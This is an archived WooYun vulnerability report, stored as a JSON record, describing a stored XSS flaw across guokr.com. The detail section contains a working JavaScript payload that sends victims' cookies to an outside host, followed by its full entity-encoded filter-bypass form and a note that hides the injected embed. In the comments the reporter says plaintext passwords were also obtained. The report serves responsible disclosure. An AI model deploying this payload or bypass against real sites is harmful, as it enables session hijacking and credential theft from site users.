{"id": 17639, "wybug_id": "wooyun-2012-011886", "wybug_title": "果壳网全站储存性xss漏洞", "wybug_corp": "果壳传媒", "wybug_author": "kamael", "wybug_date": "2012-09-07 18:45", "wybug_open_date": "2012-09-12 18:46", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-09-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-09-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 果壳网一处xss，几乎影响guokr.com 全站。 详细说明：     在果壳网任意可以添加讨论的地方都存在此漏洞，包括主题站，问答，小组等。果壳网允许插入[flash]something[/flash]伪标签来引入外部flash文件，虽然对 something做了处理，但是在处理上有问题，导致可以构造字符串绕过过滤。   插入flash后的代码是这样的： \n\n   在伪标签内对();\"'等都做了过滤，但是忽略了&.把&转化成&%26即可绕过。因此可以把跨站代码转化为&#12 这样。对 \njavascript:var img = document.createElement(\"img\");img.src =\"http://tessss.sinaapp.com/?ass=\"+escape(document.cookie);document.body.appendChild(img);document.getElementsByTagName('embed')[0].height=0;\n进行编码，并把&替换成%26，得到\n%26#106%26#97%26#118%26#97%26#115%26#99%26#114%26#105%26#112%26#116%26#58%26#118%26#97%26#114%26#32%26#105%26#109%26#103%26#32%26#61%26#32%26#100%26#111%26#99%26#117%26#109%26#101%26#110%26#116%26#46%26#99%26#114%26#101%26#97%26#116%26#101%26#69%26#108%26#101%26#109%26#101%26#110%26#116%26#40%26#34%26#105%26#109%26#103%26#34%26#41%26#59%26#105%26#109%26#103%26#46%26#115%26#114%26#99%26#32%26#61%26#34%26#104%26#116%26#116%26#112%26#58%26#47%26#47%26#116%26#101%26#115%26#115%26#115%26#115%26#46%26#115%26#105%26#110%26#97%26#97%26#112%26#112%26#46%26#99%26#111%26#109%26#47%26#63%26#97%26#115%26#115%26#61%26#34%26#43%26#101%26#115%26#99%26#97%26#112%26#101%26#40%26#100%26#111%26#99%26#117%26#109%26#101%26#110%26#116%26#46%26#99%26#111%26#111%26#107%26#105%26#101%26#41%26#59%26#100%26#111%26#99%26#117%26#109%26#101%26#110%26#116%26#46%26#98%26#111%26#100%26#121%26#46%26#97%26#112%26#112%26#101%26#110%26#100%26#67%26#104%26#105%26#108%26#100%26#40%26#105%26#109%26#103%26#41%26#59%26#10%26#100%26#111%26#99%26#117%26#109%26#101%26#110%26#116%26#46%26#103%26#101%26#116%26#69%26#108%26#101%26#109%26#101%26#110%26#116%26#115%26#66%26#121%26#84%26#97%26#103%26#78%26#97%26#109%26#101%26#40%26#39%26#101%26#109%26#98%26#101%26#100%26#39%26#41%26#91%26#48%26#93%26#46%26#104%26#101%26#105%26#103%26#104%26#116%26#61%26#48%26#59\n然后把上述代码插入到抓包的[flash][/flash]之间发送即可，当然为了避免发一个白色的swf引起怀疑，所以在代码中把embed的高度设为0.貌似服务器端会对一些符号转化为encode的形式，懒得试了。。   漏洞证明：  上回提交的漏洞被忽略了。。。这回直接取cookie。。。不过放心我不会乱搞的。。这是截图，别说不认得自家的cookie、、\n\n\n\n另实验的网址：http://www.guokr.com/post/333736/ 七楼就是那个“看不见的swf”,看完证明删掉吧。。另外求被封号哈，果壳是个好网站   修复方案：  <>\"'&\\/这些都是经典跨站了...代码没细心写。。。   版权声明：转载请注明来源 kamael@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-09-12 18:46 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-09-07 19:02 |    \t\tkamael \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:7        | 。。。)\t\t \n  忽然发现其实做了httponly cookie用处不大...顿时毫无罪恶感。。。    \n     2012-09-07 19:29 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @kamael 额 没有bypass下？    \n     2012-09-07 21:02 |    \t\tkamael \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:7        | 。。。)\t\t \n  @xsser 没..刚刚测试了一下获取明文密码，取到了。    \n     2012-09-07 22:16 |    \t\tqiaoy \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:16        )\t\t \n  .    \n     2012-09-10 08:57 |    \t\tkamael \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:7        | 。。。)\t\t \n  @xsser 额，为什么重新编辑的没通过。。加上了获取明文密码的内容。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}